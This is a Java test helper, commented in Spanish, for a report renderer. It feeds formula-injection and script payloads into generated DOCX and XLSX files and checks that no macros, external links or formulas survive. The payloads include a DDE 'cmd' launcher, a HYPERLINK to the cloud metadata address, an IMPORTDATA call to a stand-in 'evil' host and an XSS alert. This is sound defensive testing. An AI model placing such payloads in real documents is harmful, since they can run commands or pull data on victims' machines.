package com.hexora.hexora.informes.render;

import static org.assertj.core.api.Assertions.assertThat;

import com.hexora.hexora.informes.TipoInforme;
import com.hexora.hexora.informes.snapshot.ConstructorSnapshot;
import com.hexora.hexora.informes.snapshot.ConstructorSnapshot.FuenteArea;
import com.hexora.hexora.informes.snapshot.ConstructorSnapshot.FuenteVulnerabilidad;
import com.hexora.hexora.informes.snapshot.InformeSnapshot;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.zip.ZipEntry;

/** Apoyo común de las pruebas de DOCX y XLSX: datos hostiles y revisión del contenedor ZIP. */
public final class OfimaticaPrueba {

    /** Textos que una hoja de cálculo podría interpretar como fórmula, comando o hipervínculo. */
    public static final List<String> FORMULAS = List.of(
        "=HYPERLINK(\"http://169.254.169.254/latest/meta-data/\",\"clic\")", "+cmd|' /C calc'!A0", "-1+1",
        "@SUM(1+1)", "=1+1", "\t=1+1", "=IMPORTDATA(\"http://evil/x\")");

    private OfimaticaPrueba() {
    }

    public static InformeSnapshot snapshotConFormulas(TipoInforme tipo, boolean noPublicado) {
        FuenteArea area = new FuenteArea("a-1", FORMULAS.get(0), FORMULAS.get(1));
        List<FuenteVulnerabilidad> vs = new ArrayList<>();
        for (int n = 0; n < FORMULAS.size(); n++) {
            vs.add(DatosDemo.v(String.format("%06x", 0xabc000 + n), area, FORMULAS.get(n), 9, 9, 9, 5, "Abierta",
                FORMULAS.get((n + 1) % FORMULAS.size()), null, null));
        }
        // Caracteres de control y un texto más largo que el máximo de una celda de Excel.
        vs.add(DatosDemo.v("abcfff", area, "Control \u0000\u0007\u001b fin \uD800 suelto", 3, 3, 3, 5, "Abierta",
            "x".repeat(40_000), null, null));
        Map<String, String> narrativa = new LinkedHashMap<>();
        for (TipoInforme.SeccionNarrativa seccion : tipo.secciones()) {
            narrativa.put(seccion.clave(), "=HYPERLINK(\"http://x\")\n\n- +cmd\n- -1+1\n- @SUM(A1)\n\n"
                + "| =a | @b |\n|---|---|\n| +c | -d |\n\n`=code` **<script>alert(1)</script>**");
        }
        return ConstructorSnapshot.construir(DatosDemo.entrada(tipo, noPublicado, narrativa, vs, List.of(area)));
    }

    /** Nombres de todas las entradas del ZIP. */
    public static List<String> entradas(byte[] zip) throws IOException {
        return abrir(zip, (archivo, nombres) -> {
            List<String> lista = new ArrayList<>();
            archivo.stream().forEach(e -> lista.add(e.getName()));
            return lista;
        });
    }

    /** Contenido de texto de las entradas XML y de relaciones del ZIP, por nombre. */
    public static Map<String, String> textos(byte[] zip) throws IOException {
        return abrir(zip, (archivo, nombres) -> {
            Map<String, String> contenido = new LinkedHashMap<>();
            var entradas = archivo.entries();
            while (entradas.hasMoreElements()) {
                ZipEntry e = entradas.nextElement();
                String n = e.getName();
                if (n.endsWith(".xml") || n.endsWith(".rels")) {
                    try (var in = archivo.getInputStream(e)) {
                        contenido.put(n, new String(in.readAllBytes(), StandardCharsets.UTF_8));
                    }
                }
            }
            return contenido;
        });
    }

    private interface Lector<T> {
        T leer(java.util.zip.ZipFile archivo, Object sinUso) throws IOException;
    }

    /** El ZIP en streaming de SXSSF no se lee bien con ZipInputStream; se lee con ZipFile desde un temporal. */
    private static <T> T abrir(byte[] zip, Lector<T> lector) throws IOException {
        java.nio.file.Path temporal = java.nio.file.Files.createTempFile("ofimatica", ".zip");
        try {
            java.nio.file.Files.write(temporal, zip);
            try (java.util.zip.ZipFile archivo = new java.util.zip.ZipFile(temporal.toFile())) {
                return lector.leer(archivo, null);
            }
        } finally {
            java.nio.file.Files.deleteIfExists(temporal);
        }
    }

    /**
     * El contenedor no trae macros, objetos incrustados, relaciones externas ni enlaces: lo que prohíben §7.2 y §7.3.
     */
    public static void verificarContenedorSinRiesgos(byte[] zip) throws IOException {
        for (String nombre : entradas(zip)) {
            String minuscula = nombre.toLowerCase(java.util.Locale.ROOT);
            assertThat(minuscula).as("entrada " + nombre).doesNotContain("vbaproject").doesNotContain("embeddings")
                .doesNotContain("activex").doesNotContain("oleobject").doesNotContain("externallink")
                .doesNotContain("connections").doesNotContain("customxml");
        }
        for (Map.Entry<String, String> e : textos(zip).entrySet()) {
            String xml = e.getValue();
            assertThat(xml).as(e.getKey()).doesNotContain("TargetMode=\"External\"").doesNotContain("macroEnabled")
                .doesNotContain("vnd.ms-office.vbaProject").doesNotContain("<w:hyperlink").doesNotContain("<hyperlink ")
                .doesNotContain("<w:altChunk").doesNotContain("<w:object").doesNotContain("<f>").doesNotContain("<f ");
        }
    }
}
